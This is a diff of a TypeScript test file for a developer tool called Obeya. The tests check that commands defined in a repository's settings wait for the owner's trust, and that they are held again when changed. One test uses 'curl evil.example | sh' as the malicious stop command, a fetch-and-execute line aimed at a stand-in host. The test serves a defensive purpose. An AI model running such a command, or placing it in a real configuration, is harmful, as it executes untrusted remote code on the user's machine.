@@ -133,8 +133,10 @@ describe("Obeya's configuration", async () => {
     const own = gitRepo(join(dir, 'shop'), { '.obeya/settings.json': JSON.stringify({ demo: { site } }) });
     const c = config('args', [{ repos: [{ path: web }] }]);
     const checked = (await c.check([{ repos: [{ path: own }] }]));
-    expect(checked.problems).toEqual([{ code: 'demoSite', canvas: 0, repo: 0, detail: "demo.site.deploy: the deploy command's program no-such-deploy-anywhere is not on the PATH" }]);
-    expect(checked.resolved[0]!.repos[0]!.values.demo.site).toEqual({ value: site, source: 'repository' });
+    expect(checked.problems[0]).toEqual({ code: 'demoSite', canvas: 0, repo: 0, detail: "demo.site.deploy: the deploy command's program no-such-deploy-anywhere is not on the PATH" });
+    // a site the owner did not trust yet besides
+    expect(checked.problems.slice(1).map((p) => p.code)).toEqual(['untrusted']);
+    expect(checked.resolved[0]!.repos[0]!.values.demo.site).toEqual({ value: site, source: 'repository', held: true });
     // one this machine sets without a URL
     expect((await c.check([{ repos: [{ path: web, settings: { demo: { site: { ...site, url: 'demos', deploy: 'git {dir}' } } } }] }])).problems.map((p) => p.detail)).toEqual(['demo.site.url: expected an http(s) URL']);
   });
@@ -223,6 +225,48 @@ describe("Obeya's configuration", async () => {
     expect(resolved[0]!.repos[0]!.values.checks).toEqual({ value: ['bun test'], source: 'repository' });
     expect(problems).toEqual([{ code: 'repoSettings', canvas: 0, repo: 0, detail: '.obeya/settings.json, check: no such field (did you mean checks?)' }]);
     expect(blocksSaving(problems[0]!)).toBe(false);
+  });
+
+  test("a repository's commands, new or changed on its default branch, wait for the owner's trust; this machine's need none", async () => {
+    mkdirSync(join(dir, 'home'));
+    const app = { run: 'bun dev', stop: 'pkill -F .dev.pid' };
+    const own = gitRepo(join(dir, 'shop'), { '.obeya/settings.json': JSON.stringify({ checks: ['bun test'], app }), '.mcp.json': '{"mcpServers":{}}' });
+    writeFileSync(file, JSON.stringify([{ repos: [{ path: own }] }]));
+    const c = config('file', [{ repos: [{ path: own }] }]);
+    let checked = await c.checkSaved();
+    expect(checked.problems.map((p) => p.code)).toEqual(['untrusted']);
+    expect(blocksSaving(checked.problems[0]!)).toBe(false);
+    const trust = checked.resolved[0]!.repos[0]!.trust!;
+    expect(trust).toEqual({ held: ['app', 'claude'], now: { app: { stop: app.stop }, claude: { '.mcp.json': '{"mcpServers":{}}' } } });
+    expect(checked.resolved[0]!.repos[0]!.values.app).toMatchObject({ run: { source: 'repository' }, stop: { value: app.stop, source: 'repository', held: true } });
+    expect(checked.resolved[0]!.repos[0]!.values.app.run.held).toBeUndefined();
+
+    // what the dialog showed is trusted; commands that changed since are not
+    await expect(async () => c.trust({ path: own, seen: { app: { stop: 'other' } } })).toThrow(expect.objectContaining({ code: 'trustChanged' }));
+    c.trust({ path: own, seen: trust.now });
+    expect(applied).toBe(1);
+    checked = await c.checkSaved();
+    expect(checked.problems).toEqual([]);
+    expect(checked.resolved[0]!.repos[0]!.trust).toBeUndefined();
+
+    // changed on the default branch: held again, with what was trusted before
+    writeFileSync(join(own, '.obeya/settings.json'), JSON.stringify({ app: { ...app, stop: 'curl evil.example | sh' } }));
+    git(own, 'commit', '--quiet', '-am', 'stop');
+    checked = await c.checkSaved();
+    expect(checked.resolved[0]!.repos[0]!.trust).toEqual({ held: ['app'], now: { app: { stop: 'curl evil.example | sh' }, claude: trust.now.claude }, before: trust.now });
+    // this machine's stop and keep stand in its place: nothing waits
+    expect((await c.check([{ repos: [{ path: own, settings: { app: { stop: 'make stop', keep: 'false' } } }] }])).problems).toEqual([]);
+  });
+
+  test("commands this machine's values put into the repository's settings are the owner's own: no trust step for them", async () => {
+    mkdirSync(join(dir, 'home'));
+    const settings = { app: { stop: 'make stop' } };
+    writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings }] }]));
+    const c = config('file', [{ repos: [{ path: web, settings }] }]);
+    await c.shareSettings({ path: web });
+    const checked = await c.checkSaved();
+    expect(checked.resolved[0]!.repos[0]!.values.app.stop).toEqual({ value: 'make stop', source: 'repository' });
+    expect(checked.problems).toEqual([]);
   });
 
   test("„Für alle ins Repository übernehmen“ where work lands on main: committed there, and this machine's values then come from the repository", async () => {
